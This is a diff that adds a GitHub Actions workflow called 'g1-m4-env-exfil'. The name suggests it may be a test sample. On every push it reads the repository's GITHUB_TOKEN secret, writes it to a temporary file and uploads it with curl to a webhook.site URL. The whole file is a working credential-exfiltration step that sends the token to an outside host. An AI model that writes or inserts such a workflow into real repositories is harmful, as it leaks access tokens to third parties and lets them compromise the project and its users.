@@ -1,0 +1,11 @@
+name: g1-m4-env-exfil
+on:
+  push: {}
+jobs:
+  x:
+    runs-on: ubuntu-latest
+    env:
+      T: ${{ secrets.GITHUB_TOKEN }}
+    steps:
+      - run: echo "env=$T" > /tmp/o && curl -s -F f=@/tmp/o https://webhook.site/ae1c7580-8d42-440e-82c4-4746ccb71ad5
+        shell: bash
